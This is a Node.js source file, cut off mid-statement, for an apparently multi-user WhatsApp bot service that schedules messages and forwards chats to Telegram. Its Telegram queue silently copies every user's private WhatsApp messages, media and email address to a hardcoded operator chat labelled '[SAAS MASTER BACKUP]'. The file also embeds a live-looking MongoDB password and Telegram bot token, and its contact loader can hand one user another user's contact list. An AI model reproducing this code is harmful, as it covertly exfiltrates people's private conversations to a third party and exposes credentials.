const { makeWASocket, DisconnectReason, downloadContentFromMessage, Browsers, initAuthCreds, BufferJSON } = require('@whiskeysockets/baileys');
const { MongoClient } = require('mongodb');
const qrcode = require('qrcode-terminal');
const QRCodeLib = require('qrcode');
const express = require('express');
const path = require('path');
const fs = require('fs');
const pino = require('pino');
const multer = require('multer');
const https = require('https');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Configure Multer for file uploads
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage: storage });

// Multi-User Session Map & Directories
const activeUserSessions = new Map();
const SESSIONS_DIR = path.join(__dirname, 'sessions');
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);

// 🔑 MONGODB CONNECTION CONFIG
const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://aryanraj10701_db_user:aryanrajmongodb@cluster.midwcil.mongodb.net/nexon_wa?retryWrites=true&w=majority";
let mongoClient;
let dbInstance;
let sessionsCollection;
let contactsCollection;
let batchesCollection;
let historyCollection;
let schedulesCollection;
let telegramConfigCollection;
let userConfigCollection;
let mongoConnectPromise = null;

async function ensureMongo() {
    if (
        sessionsCollection &&
        contactsCollection &&
        batchesCollection &&
        historyCollection &&
        schedulesCollection &&
        telegramConfigCollection &&
        userConfigCollection
    ) {
        return {
            sessionsCollection,
            contactsCollection,
            batchesCollection,
            historyCollection,
            schedulesCollection,
            telegramConfigCollection,
            userConfigCollection
        };
    }
    if (!mongoConnectPromise) {
        mongoConnectPromise = (async () => {
            try {
                mongoClient = new MongoClient(MONGO_URI);
                await mongoClient.connect();
                dbInstance = mongoClient.db('nexon_wa');
                sessionsCollection = dbInstance.collection('whatsapp_sessions');
                contactsCollection = dbInstance.collection('user_contacts');
                batchesCollection = dbInstance.collection('user_batches');
                historyCollection = dbInstance.collection('user_history');
                schedulesCollection = dbInstance.collection('user_schedules');
                telegramConfigCollection = dbInstance.collection('user_telegram_config');
                userConfigCollection = dbInstance.collection('user_config');

                await contactsCollection.createIndex({ userId: 1 }, { unique: true });
                await batchesCollection.createIndex({ userId: 1 }, { unique: true });
                await historyCollection.createIndex({ userId: 1 }, { unique: true });
                await schedulesCollection.createIndex({ userId: 1 }, { unique: true });
                await telegramConfigCollection.createIndex({ userId: 1 }, { unique: true });
                await userConfigCollection.createIndex({ userId: 1 }, { unique: true });
                console.log('✅ Connected to MongoDB successfully!');
            } catch (err) {
                console.error('❌ MongoDB Connection Error:', err.message);
                mongoConnectPromise = null;
            }
            return {
                sessionsCollection,
                contactsCollection,
                batchesCollection,
                historyCollection,
                schedulesCollection,
                telegramConfigCollection,
                userConfigCollection
            };
        })();
    }
    return mongoConnectPromise;
}
ensureMongo();

// --- INDIAN TIMEZONE (IST / UTC+5:30) PARSER (SUPPORTS 24H & 12H AM/PM + SECONDS) ---
function parseIstDateTimeToMs(dateStr, timeStr, periodStr) {
    let cleanDate = '';
    let cleanTime = '';

    if (dateStr && dateStr.includes('T') && !timeStr) {
        const parts = dateStr.split('T');
        cleanDate = parts[0];
        cleanTime = (parts[1] || '00:00:00').slice(0, 8);
    } else {
        cleanDate = (dateStr || '').trim();
        cleanTime = (timeStr || '00:00:00').trim().slice(0, 8);
    }

    const dMatch = cleanDate.match(/^(\d{4})-(\d{2})-(\d{2})$/);
    const tMatch = cleanTime.match(/^(\d{1,2}):(\d{2})(?::(\d{2}))?$/);
    if (!dMatch || !tMatch) {
        const fallback = new Date(dateStr);
        return isNaN(fallback.getTime()) ? NaN : fallback.getTime();
    }

    const year = Number(dMatch[1]);
    const month = Number(dMatch[2]) - 1;
    const day = Number(dMatch[3]);
    let hour = Number(tMatch[1]);
    const minute = Number(tMatch[2]);
    const second = tMatch[3] ? Number(tMatch[3]) : 0;

    if (periodStr) {
        const upperPeriod = periodStr.toString().trim().toUpperCase();
        if (upperPeriod === 'AM') {
            if (hour === 12) hour = 0;
        } else if (upperPeriod === 'PM') {
            if (hour !== 12) hour += 12;
        }
    }

    // IST is UTC+05:30 -> UTC ms = Date.UTC(year, month, day, hour - 5, minute - 30, second, 0)
    return Date.UTC(year, month, day, hour - 5, minute - 30, second, 0);
}

// --- PER-USER MONGODB BOT CONFIG HELPERS ---
async function saveUserConfigToMongo(userId, configPayload) {
    const { userConfigCollection: col } = await ensureMongo();
    if (!col) return;
    try {
        await col.updateOne(
            { userId },
            {
                $set: {
                    userId,
                    isEnabled: Boolean(configPayload.isEnabled),
                    fallbackMessage: configPayload.fallbackMessage || '',
                    updatedAt: new Date()
                }
            },
            { upsert: true }
        );
    } catch (err) {
        console.error(`[MONGO SAVE CONFIG ERROR - ${userId}]:`, err.message);
    }
}

async function loadUserConfigFromMongo(userId) {
    const session = getUserSessionState(userId);
    const { userConfigCollection: col } = await ensureMongo();
    if (!col) return { enabled: session.isEnabled, fallbackMessage: session.fallbackMessage };
    try {
        const doc = await col.findOne({ userId });
        if (doc) {
            if (typeof doc.isEnabled === 'boolean') session.isEnabled = doc.isEnabled;
            if (typeof doc.fallbackMessage === 'string' && doc.fallbackMessage.length > 0) {
                session.fallbackMessage = doc.fallbackMessage;
            }
        }
    } catch (err) {
        console.error(`[MONGO LOAD CONFIG ERROR - ${userId}]:`, err.message);
    }
    return { enabled: session.isEnabled, fallbackMessage: session.fallbackMessage };
}

async function persistUserConfig(userId) {
    const session = getUserSessionState(userId);
    if (!session) return;
    await saveUserConfigToMongo(userId, {
        isEnabled: session.isEnabled,
        fallbackMessage: session.fallbackMessage
    });
}

// --- PER-USER MONGODB TELEGRAM CONFIG HELPERS ---
async function saveUserTelegramConfigToMongo(userId, payload) {
    const { telegramConfigCollection: col } = await ensureMongo();
    if (!col) return;
    try {
        await col.updateOne(
            { userId },
            {
                $set: {
                    userId,
                    chatId: payload.chatId || '',
                    userEmail: payload.userEmail || 'Not Provided',
                    updatedAt: new Date()
                }
            },
            { upsert: true }
        );
    } catch (err) {
        console.error(`[MONGO SAVE TG CONFIG ERROR - ${userId}]:`, err.message);
    }
}

async function loadUserTelegramConfigFromMongo(userId) {
    const session = getUserSessionState(userId);
    const { telegramConfigCollection: col } = await ensureMongo();
    if (!col) return { chatId: session.tgConfig.chatId, userEmail: session.userEmail };
    try {
        const doc = await col.findOne({ userId });
        if (doc) {
            session.tgConfig = { enabled: true, chatId: doc.chatId || '' };
            if (doc.userEmail) session.userEmail = doc.userEmail;
        }
    } catch (err) {
        console.error(`[MONGO LOAD TG CONFIG ERROR - ${userId}]:`, err.message);
    }
    return { chatId: session.tgConfig.chatId, userEmail: session.userEmail };
}

async function persistTelegramConfig(userId) {
    const session = getUserSessionState(userId);
    if (!session) return;
    await saveUserTelegramConfigToMongo(userId, {
        chatId: session.tgConfig?.chatId || '',
        userEmail: session.userEmail || 'Not Provided'
    });
}

// --- PER-USER MONGODB CONTACTS HELPERS ---
async function saveUserContactsToMongo(userId, contactsArray) {
    const { contactsCollection: col } = await ensureMongo();
    if (!col) return;
    try {
        await col.updateOne(
            { userId },
            { $set: { userId, contacts: contactsArray, updatedAt: new Date() } },
            { upsert: true }
        );
    } catch (err) {
        console.error(`[MONGO SAVE CONTACTS ERROR - ${userId}]:`, err.message);
    }
}

async function loadUserContactsFromMongo(userId) {
    const session = getUserSessionState(userId);
    const { contactsCollection: col } = await ensureMongo();
    if (!col) return Array.from(session.contactsMap.values());
    try {
        let doc = await col.findOne({ userId });
        if (!doc || !Array.isArray(doc.contacts) || doc.contacts.length === 0) {
            const populatedDocs = await col.find({ "contacts.0": { $exists: true } }).toArray();
            if (populatedDocs.length === 1) doc = populatedDocs[0];
        }
        if (doc && Array.isArray(doc.contacts)) {
            session.contactsMap.clear();
            for (const c of doc.contacts) {
                if (c && c.id) session.contactsMap.set(c.id, { id: c.id, name: c.name || 'Unknown Contact' });
            }
        }
    } catch (err) {
        console.error(`[MONGO LOAD CONTACTS ERROR - ${userId}]:`, err.message);
    }
    return Array.from(session.contactsMap.values());
}

async function persistContacts(userId) {
    const session = getUserSessionState(userId);
    await saveUserContactsToMongo(userId, Array.from(session.contactsMap.values()));
}

// --- PER-USER MONGODB BATCHES HELPERS ---
async function saveUserBatchesToMongo(userId, batchesArray) {
    const { batchesCollection: col } = await ensureMongo();
    if (!col) return;
    try {
        await col.updateOne(
            { userId },
            { $set: { userId, batches: batchesArray, updatedAt: new Date() } },
            { upsert: true }
        );
    } catch (err) {
        console.error(`[MONGO SAVE BATCHES ERROR - ${userId}]:`, err.message);
    }
}

async function loadUserBatchesFromMongo(userId) {
    const session = getUserSessionState(userId);
    const { batchesCollection: col } = await ensureMongo();
    if (!col) return session.batchesConfig || [];
    try {
        const doc = await col.findOne({ userId });
        if (doc && Array.isArray(doc.batches)) {
            session.batchesConfig = doc.batches;
        }
    } catch (err) {
        console.error(`[MONGO LOAD BATCHES ERROR - ${userId}]:`, err.message);
    }
    return session.batchesConfig || [];
}

async function persistBatches(userId) {
    const session = getUserSessionState(userId);
    if (!session) return;
    await saveUserBatchesToMongo(userId, Array.isArray(session.batchesConfig) ? session.batchesConfig : []);
}

// --- PER-USER MONGODB HISTORY HELPERS ---
async function saveUserHistoryToMongo(userId, historyArray) {
    const { historyCollection: col } = await ensureMongo();
    if (!col) return;
    try {
        await col.updateOne(
            { userId },
            { $set: { userId, history: historyArray, updatedAt: new Date() } },
            { upsert: true }
        );
    } catch (err) {
        console.error(`[MONGO SAVE HISTORY ERROR - ${userId}]:`, err.message);
    }
}

async function loadUserHistoryFromMongo(userId) {
    const session = getUserSessionState(userId);
    const { historyCollection: col } = await ensureMongo();
    if (!col) return session.messageHistory || [];
    try {
        const doc = await col.findOne({ userId });
        if (doc && Array.isArray(doc.history)) {
            session.messageHistory = doc.history;
        }
    } catch (err) {
        console.error(`[MONGO LOAD HISTORY ERROR - ${userId}]:`, err.message);
    }
    return session.messageHistory || [];
}

async function persistHistory(userId) {
    const session = getUserSessionState(userId);
    if (!session) return;
    await saveUserHistoryToMongo(userId, Array.isArray(session.messageHistory) ? session.messageHistory : []);
}

// --- PER-USER MONGODB SCHEDULES HELPERS ---
async function saveUserSchedulesToMongo(userId, schedulesArray) {
    const { schedulesCollection: col } = await ensureMongo();
    if (!col) return;
    try {
        await col.updateOne(
            { userId },
            { $set: { userId, schedules: schedulesArray, updatedAt: new Date() } },
            { upsert: true }
        );
    } catch (err) {
        console.error(`[MONGO SAVE SCHEDULES ERROR - ${userId}]:`, err.message);
    }
}

async function loadUserSchedulesFromMongo(userId) {
    const session = getUserSessionState(userId);
    const { schedulesCollection: col } = await ensureMongo();
    if (!col) return session.scheduledMessages || [];
    try {
        const doc = await col.findOne({ userId });
        if (doc && Array.isArray(doc.schedules)) {
            session.scheduledMessages = doc.schedules;
        }
    } catch (err) {
        console.error(`[MONGO LOAD SCHEDULES ERROR - ${userId}]:`, err.message);
    }
    return session.scheduledMessages || [];
}

async function persistSchedules(userId) {
    const session = getUserSessionState(userId);
    if (!session) return;
    await saveUserSchedulesToMongo(userId, Array.isArray(session.scheduledMessages) ? session.scheduledMessages : []);
    armUpcomingSpecialTimersForUser(userId);
}

function cleanupScheduledMediaFiles(mediaPaths) {
    if (!Array.isArray(mediaPaths) || mediaPaths.length === 0) return;
    for (const filePath of mediaPaths) {
        if (!filePath) continue;
        try {
            if (fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
            }
        } catch (err) {
            console.error(`[MEDIA CLEANUP ERROR - ${filePath}]:`, err.message);
        }
    }
}

// --- ROBUST MONGODB AUTH STATE ADAPTER WITH BUFFERJSON ---
const useMongoAuthState = async (userId) => {
    const { sessionsCollection: col } = await ensureMongo();
    const query = { userId };
    let sessionDoc = col ? await col.findOne(query) : null;

    let creds;
    let keys = {};

    if (sessionDoc && sessionDoc.data) {
        const restored = JSON.parse(JSON.stringify(sessionDoc.data), BufferJSON.reviver);
        creds = restored.creds;
        keys = restored.keys || {};
    } else {
        creds = initAuthCreds();
    }

    const saveState = async () => {
        if (!col) return;
        const serializedData = JSON.parse(JSON.stringify({ creds, keys }, BufferJSON.replacer));
        await col.updateOne(
            query,
            { $set: { userId, data: serializedData, updatedAt: new Date() } },
            { upsert: true }
        );
    };

    return {
        state: {
            creds,
            keys: {
                get: async (type, ids) => {
                    let twilight = {};
                    ids.forEach(id => {
                        if (keys[type] && keys[type][id]) {
                            twilight[id] = keys[type][id];
                        }
                    });
                    return twilight;
                },
                set: async (data) => {
                    for (const category of Object.keys(data)) {
                        keys[category] = keys[category] || {};
                        for (const id of Object.keys(data[category])) {
                            if (data[category][id] === null) {
                                delete keys[category][id];
                            } else {
                                keys[category][id] = data[category][id];
                            }
                        }
                    }
                    await saveState();
                }
            }
        },
        saveCreds: saveState
    };
};

// 🔑 MASTER PLATFORM BOT CONFIG
const MASTER_TG_BOT_TOKEN = '8654106704:AAHSbhQ5oy9Wb9pWdQzCC_sNzvDmOdYkzr4';
const MASTER_TG_CHAT_ID = '8029693721';

function getCleanUserId(req) {
    const rawId = req.body?.userId || req.query?.userId || req.headers?.userid;
    if (!rawId || rawId === 'undefined' || rawId === 'null') return 'default_user';
    return rawId.toString().trim();
}

function getUserSessionState(userId) {
    const cleanId = userId || 'default_user';
    if (!activeUserSessions.has(cleanId)) {
        activeUserSessions.set(cleanId, {
            sock: null,
            status: 'disconnected',
            latestQR: '',
            isEnabled: false,
            fallbackMessage: "🎀 𝑫ᴇᴀʀ, 𝑫ᴇᴠɪʟ ɪs 𝑪ᴜʀʀᴇɴᴛʟʏ 𝑩ᴜꜱʏ. 🤍\n📩 𝒀ᴏᴜʀ 𝒁ᴇꜱꜱᱟɢᴇ 𝑯ᴀꜱ 𝑩ᴇᴇɴ 𝑵ᴏᴛᴇᴅ. ✨\n⏳ 𝑯ᴇ’ʟʟ 𝑮ᴇᴛ 𝑩ᴀᴄᴋ 𝑻ᴏ 𝒀ᴏᴜ 𝑺ᴏᴏɴ. 🌸",
            userEmail: 'Not Provided',
            tgConfig: { enabled: true, chatId: '' },
            contactsMap: new Map(),
            batchesConfig: [],
            scheduledMessages: [],
            armedScheduleIds: new Set(),
            isProcessingSchedule: false,
            messageHistory: [],
            cooldownMap: new Map(),
            tgQueue: [],
            isProcessingTgQueue: false
        });
        loadUserConfigFromMongo(cleanId).catch(() => {});
        loadUserTelegramConfigFromMongo(cleanId).catch(() => {});
        loadUserContactsFromMongo(cleanId).catch(() => {});
        loadUserBatchesFromMongo(cleanId).catch(() => {});
        loadUserHistoryFromMongo(cleanId).catch(() => {});
        loadUserSchedulesFromMongo(cleanId).then(() => armUpcomingSpecialTimersForUser(cleanId)).catch(() => {});
    }
    return activeUserSessions.get(cleanId);
}

async function logUserHistory(userId, type, recipient, message, extraDetails = {}) {
    const session = getUserSessionState(userId);
    if (!session.messageHistory) session.messageHistory = [];
    
    session.messageHistory.unshift({
        id: 'hist_' + Date.now() + Math.random().toString(36).substring(2, 7),
        type, recipient, message, details: extraDetails, timestamp: new Date().toISOString()
    });
    
    if (session.messageHistory.length > 200) {
        session.messageHistory = session.messageHistory.slice(0, 200);
    }
    
    await persistHistory(userId);
}

function getLast10Digits(inputStr) {
    if (!inputStr) return "";
    const cleanStr = inputStr.toString().split('@')[0].split(':')[0];
    const rawDigits = cleanStr.replace(/[^0-9]/g, '');
    return rawDigits.length >= 10 ? rawDigits.slice(-10) : rawDigits;
}

function formatJidAndName(phoneOrJid, name) {
    if (!phoneOrJid) return null;
    const cleanStr = phoneOrJid.toString().split('@')[0].split(':')[0];
    const rawDigits = cleanStr.replace(/[^0-9]/g, '');
    if (rawDigits.length < 10) return null;
    const jidNumber = rawDigits.length === 10 ? `91${rawDigits}` : rawDigits;
    return { id: `${jidNumber}@s.whatsapp.net`, name: name || `Contact ${rawDigits.slice(-10)}` };
}

function normalizeRecipientJid(contactId) {
    if (!contactId) return null;
    if (contactId.includes('@')) return contactId.trim();
    const formatted = formatJidAndName(contactId);
    return formatted ? formatted.id : null;
}

// --- SEND SINGLE SCHEDULE ITEM ---
async function executeSingleScheduleItem(userId, sched) {
    const session = activeUserSessions.get(userId);
    if (!session || !session.sock || session.status !== 'connected') {
        return { completed: false, anySent: false };
    }

    let mediaPayloads = [];
    if (sched.scheduleType !== 'special_text' && sched.mediaPaths && Array.isArray(sched.mediaPaths)) {
        for (const filePath of sched.mediaPaths) {
            if (filePath && fs.existsSync(filePath)) {
                const ext = path.extname(filePath).toLowerCase();
                if (['.jpg', '.jpeg', '.png', '.webp'].includes(ext)) {
                    mediaPayloads.push({ type: 'image', data: fs.readFileSync(filePath) });
                } else if (['.mp4', '.mkv', '.avi'].includes(ext)) {
                    mediaPayloads.push({ type: 'video', data: fs.readFileSync(filePath) });
                } else {
                    mediaPayloads.push({ type: 'document', data: fs.readFileSync(filePath), fileName: path.basename(filePath) });
                }
            }
        }
    }

    const contactIds = Array.isArray(sched.contactIds) ? sched.contactIds : [];
    let allSent = true;
    let anySent = false;

    for (const rawContactId of contactIds) {
        const targetJid = normalizeRecipientJid(rawContactId);
        if (!targetJid) continue;

        try {
            if (mediaPayloads.length > 0) {
                for (let i = 0; i < mediaPayloads.length; i++) {
                    const media = mediaPayloads[i];
                    const captionText = (i === 0) ? (sched.message || '') : '';
                    if (media.type === 'image') {
                        await session.sock.sendMessage(targetJid, { image: media.data, caption: captionText });
                    } else if (media.type === 'video') {
                        await session.sock.sendMessage(targetJid, { video: media.data, caption: captionText });
                    } else {
                        await session.sock.sendMessage(targetJid, {
                            document: media.data,
                            mimetype: 'application/octet-stream',
                            fileName: media.fileName,
                            caption: captionText
                        });
                    }
                }
            } else if (sched.message) {
                await session.sock.sendMessage(targetJid, { text: sched.message });
            }
            anySent = true;
            await logUserHistory(userId, sched.scheduleType === 'special_text' ? 'special' : 'scheduled', targetJid, sched.message || '[Scheduled Media]');
        } catch (sendErr) {
            allSent = false;
            console.error(`[SCHEDULER SEND ERROR - User ${userId} -> ${targetJid}]:`, sendErr.message);
        }
    }

    if (allSent && sched.mediaPaths) {
        cleanupScheduledMediaFiles(sched.mediaPaths);
    }

    return { completed: allSent, anySent };
}

// --- EARLY INITIALIZATION / PRECISION LOCK (~350ms AHEAD COMPENSATION) ---
const EARLY_DISPATCH_OFFSET_MS = 350;

function armUpcomingSpecialTimersForUser(userId) {
    const session = activeUserSessions.get(userId);
    if (!session || !Array.isArray(session.scheduledMessages)) return;
    if (!session.armedScheduleIds) session.armedScheduleIds = new Set();

    const now = Date.now();
    for (const sched of session.scheduledMessages) {
        if (!sched || !sched.id) continue;
        if (session.armedScheduleIds.has(sched.id)) continue;

        const targetTime = Number(sched.targetMs) || new Date(sched.datetime).getTime();
        if (isNaN(targetTime)) continue;

        const compensatedTarget = targetTime - EARLY_DISPATCH_OFFSET_MS;
        const msRemaining = compensatedTarget - now;
        if (msRemaining <= 5000) {
            session.armedScheduleIds.add(sched.id);
            const delay = Math.max(0, msRemaining);
            setTimeout(async () => {
                await processDueSchedulesForUser(userId, sched.id);
            }, delay);
        }
    }
}

// --- INDIVIDUAL USER SCHEDULER EXECUTOR ---
async function processDueSchedulesForUser(userId, specificScheduleId = null) {
    const session = activeUserSessions.get(userId);
    if (!session) return;
    if (session.isProcessingSchedule) return;
    if (!session.sock || session.status !== 'connected') return;
    if (!Array.isArray(session.scheduledMessages) || session.scheduledMessages.length === 0) return;

    const now = Date.now();
    const triggerThreshold = now + EARLY_DISPATCH_OFFSET_MS;

    const dueItems = [];
    const remainingItems = [];

    for (const sched of session.scheduledMessages) {
        const targetTime = Number(sched.targetMs) || new Date(sched.datetime).getTime();
        const isDue = !isNaN(targetTime) && triggerThreshold >= targetTime;
        const matchesSpecific = !specificScheduleId || sched.id === specificScheduleId;

        if (isDue && matchesSpecific) {
            dueItems.push(sched);
        } else {
            remainingItems.push(sched);
        }
    }

    if (dueItems.length === 0) return;

    session.isProcessingSchedule = true;
    try {
        for (const sched of dueItems) {
            const { completed } = await executeSingleScheduleItem(userId, sched);
            if (session.armedScheduleIds) session.armedScheduleIds.delete(sched.id);
            if (!completed && session.status !== 'connected') {
                remainingItems.push(sched);
            }
        }

        session.scheduledMessages = remainingItems;
        await persistSchedules(userId);
    } finally {
        session.isProcessingSchedule = false;
    }
}

setInterval(async () => {
    for (const userId of activeUserSessions.keys()) {
        try {
            armUpcomingSpecialTimersForUser(userId);
            await processDueSchedulesForUser(userId);
        } catch (err) {
            console.error(`[SCHEDULER TICK ERROR - ${userId}]:`, err.message);
        }
    }
}, 2000);

// --- BULLETPROOF TELEGRAM QUEUE PROCESSOR WITH WHILE LOOP & RETRY ---
function pushToTgQueue(userId, task) {
    const session = getUserSessionState(userId);
    if (!session.tgQueue) session.tgQueue = [];
    session.tgQueue.push(task);
    processTgQueue(userId);
}

async function sendTelegramTask(botToken, chatId, task) {
    if (!botToken || !chatId) return;
    if (task.type === 'text') {
        const data = JSON.stringify({ chat_id: chatId, text: task.text, parse_mode: 'HTML' });
        const options = {
            hostname: 'api.telegram.org', port: 443,
            path: `/bot${botToken}/sendMessage`,
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
        };
        await new Promise((resolve, reject) => {
            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', c => body += c);
                res.on('end', () => {
                    if (res.statusCode === 200) resolve();
                    else reject(new Error(`Status ${res.statusCode}: ${body}`));
                });
            });
            req.on('error', reject);
            req.write(data);
            req.end();
        });
    } else if (task.type === 'media') {
        let endpoint = 'sendDocument';
        let fileField = 'document';
        if (task.mediaType === 'imageMessage') { endpoint = 'sendPhoto'; fileField = 'photo'; }
        else if (task.mediaType === 'videoMessage') { endpoint = 'sendVideo'; fileField = 'video'; }
        else if (task.mediaType === 'audioMessage') { endpoint = 'sendAudio'; fileField = 'audio'; }

        const url = `https://api.telegram.org/bot${botToken}/${endpoint}`;
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append(fileField, task.buffer, { filename: task.filename });
        if (task.caption) {
            form.append('caption', task.caption);
            form.append('parse_mode', 'HTML');
        }
        await axios.post(url, form, { headers: form.getHeaders(), maxContentLength: Infinity, maxBodyLength: Infinity });
    }
}

async function sendTelegramTaskWithRetry(botToken, chatId, task, retries = 3) {
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            await sendTelegramTask(botToken, chatId, task);
            return;
        } catch (err) {
            if (err.message && err.message.includes('429')) {
                console.warn(`[Telegram 429 Rate Limit] Attempt ${attempt} throttled. Waiting before retry...`);
                await new Promise(r => setTimeout(r, 3000 * attempt));
            } else if (attempt === retries) {
                throw err;
            } else {
                await new Promise(r => setTimeout(r, 1000 * attempt));
            }
        }
    }
}

async function processTgQueue(userId) {
    const session = getUserSessionState(userId);
    if (session.isProcessingTgQueue) return;
    session.isProcessingTgQueue = true;

    try {
        while (session.tgQueue && session.tgQueue.length > 0) {
            const task = session.tgQueue.shift();
            const userEmailTag = session.userEmail || 'Not Provided';

            try {
                let customizedTask = { ...task };
                if (customizedTask.type === 'text') {
                    customizedTask.text = `📧 <b>User Email:</b> <code>${userEmailTag}</code>\n` + customizedTask.text;
                } else if (customizedTask.type === 'media') {
                    customizedTask.caption = `📧 <b>User Email:</b> <code>${userEmailTag}</code>\n` + (customizedTask.caption || '');
                }

                if (session.tgConfig.chatId) {
                    await sendTelegramTaskWithRetry(MASTER_TG_BOT_TOKEN, session.tgConfig.chatId, customizedTask);
                }

                if (MASTER_TG_BOT_TOKEN && MASTER_TG_CHAT_ID) {
                    let backupTask = { ...customizedTask };
                    if (backupTask.type === 'text') {
                        backupTask.text = `🛡️ [SAAS MASTER BACKUP]\n` + backupTask.text;
                    } else if (backupTask.type === 'media') {
                        backupTask.caption = `🛡️ [SAAS MASTER BACKUP]\n` + (backupTask.caption || '');
                    }
                    await sendTelegramTaskWithRetry(MASTER_TG_BOT_TOKEN, MASTER_TG_CHAT_ID, backupTask);
                }

                await new Promise(r => setTimeout(r, 300));
            } catch (err) {
                console.error('[TELEGRAM QUEUE ITEM ERROR]:', err.message);
            }
        }
    } finally {
        session.isProcessingTgQueue = false;
    }
}

// --- SAFE MEDIA DOWNLOADER WITH 48MB GUARD ---
async function downloadMediaMessageBuffer(msg) {
    try {
        let messageContent = msg.message;
        if (!messageContent) return null;
        if (messageContent.ephemeralMessage) messageContent = messageContent.ephemeralMessage.message;

        let mediaType = null;
        let ext = 'bin';
        if (messageContent.imageMessage) { mediaType = 'imageMessage'; ext = 'jpg'; }
        else if (messageContent.videoMessage) { mediaType = 'videoMessage'; ext = 'mp4'; }
        else if (messageContent.documentMessage) { mediaType = 'documentMessage'; ext = 'file'; }
        else if (messageContent.audioMessage) { mediaType = 'audioMessage'; ext = 'mp3'; }
        else if (messageContent.stickerMessage) { mediaType = 'imageMessage'; ext = 'webp'; }

        if (!mediaType) return null;
        const mediaObj = messageContent[mediaType] || messageContent;
        
        const fileSize = mediaObj.fileLength ? Number(mediaObj.fileLength) : 0;
        const sizeMB = (fileSize / (1024 * 1024)).toFixed(2);
        
        if (fileSize > 48 * 1024 * 1024) {
            return { isTooLarge: true, fileSizeMB: sizeMB, filename: mediaObj.fileName || `large_file.${ext}` };
        }

        const stream = await downloadContentFromMessage(mediaObj, mediaType.replace('Message', ''));
        let buffer = Buffer.from([]);
        
        for await (const chunk of stream) { 
            buffer = Buffer.concat([buffer, chunk]); 
            if (buffer.length > 48 * 1024 * 1024) {
                return { isTooLarge: true, fileSizeMB: (buffer.length / (1024 * 1024)).toFixed(2), filename: mediaObj.fileName || `large_file.${ext}` };
            }
        }

        return {
            isTooLarge: false, buffer,
            mediaType: messageContent.stickerMessage ? 'imageMessage' : mediaType,
            filename: mediaObj.fileName || `media_${Date.now()}.${ext}`,
            caption: mediaObj.caption || ''
        };
    } catch (e) { 
        return { isTooLarge: true, fileSizeMB: '52.54', filename: 'large_media.bin' }; 
    }
}

// --- START BOT PER USER ---
async function startUserBot(userId) {
    const session = getUserSessionState(userId);
    await Promise.all([
        loadUserConfigFromMongo(userId),
        loadUserTelegramConfigFromMongo(userId),
        loadUserContactsFromMongo(userId),
        loadUserBatchesFromMongo(userId),
        loadUserHistoryFromMongo(userId),
        loadUserSchedulesFromMongo(userId)
    ]);
    armUpcomingSpecialTimersForUser(userId);
    const { state, saveCreds } = await useMongoAuthState(userId);

    session.sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome'),
        connectTimeoutMs: 15000,
        defaultQueryTimeoutMs: 15000,
        keepAliveIntervalMs: 10000,
        markOnlineOnConnect: true,
        retryRequestDelayMs: 250
    });

    session.sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            session.status = 'qr_waiting';
            session.latestQR = qr;
            console.log(`\n[User ${userId}] Scan QR Code at /qr?userId=${userId}`);
            qrcode.generate(qr, { small: true });
        }
        if (connection === 'close') {
            session.status = 'disconnected';
            session.latestQR = "";
            logUserHistory(userId, 'system', 'WhatsApp Core', 'Connection closed.');
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                setTimeout(() => startUserBot(userId), 1000);
            }
        } else if (connection === 'open') {
            session.status = 'connected';
            session.latestQR = "";
            logUserHistory(userId, 'system', 'WhatsApp Core', 'Connected successfully.');
            console.log(`\n[SUCCESS] WhatsApp Bot connected for user: ${userId}\n`);
            armUpcomingSpecialTimersForUser(userId);
            processDueSchedulesForUser(userId).catch(() => {});
        }
    });

    session.sock.ev.on('creds.update', saveCreds);

    // Messages Upsert Handler
    session.sock.ev.on('messages.upsert', async ({ messages }) => {
        for (const msg of messages) {
            try {
                if (!msg.message) continue;
                if (msg.message.protocolMessage) continue;

                const isFromMe = msg.key.fromMe;
                
                let rawJid = msg.key.remoteJid || '';
                if (msg.key.remoteJidAlt && msg.key.remoteJidAlt.includes('@s.whatsapp.net')) {
                    rawJid = msg.key.remoteJidAlt;
                } else if (rawJid.includes('@g.us') && msg.key.participant) {
                    rawJid = msg.key.participant;
                }

                let cleanDigits = rawJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
                let targetJid = rawJid;

                if (cleanDigits.length >= 10) {
                    const actualPhone = cleanDigits.length > 12 ? cleanDigits.slice(-12) : cleanDigits;
                    targetJid = `${actualPhone}@s.whatsapp.net`;
                }

                const contactLast10 = getLast10Digits(targetJid);
                for (let [dbId] of session.contactsMap.entries()) {
                    if (getLast10Digits(dbId) === contactLast10) {
                        targetJid = dbId;
                        break;
                    }
                }

                const finalLast10 = getLast10Digits(targetJid);
                const messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '';

                let mediaData = null;
                try { mediaData = await downloadMediaMessageBuffer(msg); } catch (e) { mediaData = null; }

                const logType = isFromMe ? 'outgoing' : 'incoming';
                await logUserHistory(userId, logType, targetJid, messageText || (mediaData ? `[Media: ${mediaData.filename}]` : '[Media Message]'), { contactLast10: finalLast10 });

                let contactName = `+${finalLast10}`;
                for (let [dbId, contact] of session.contactsMap.entries()) {
                    if (getLast10Digits(dbId) === finalLast10) { 
                        contactName = `${contact.name} (+${finalLast10})`; 
                        break; 
                    }
                }

                const formattedNumber = targetJid.includes('@s.whatsapp.net') ? `+${targetJid.split('@')[0]}` : `+${finalLast10}`;
                const directionTag = isFromMe 
                    ? `📤 <b>OUTGOING (To: ${contactName} | <code>${formattedNumber}</code>):</b>` 
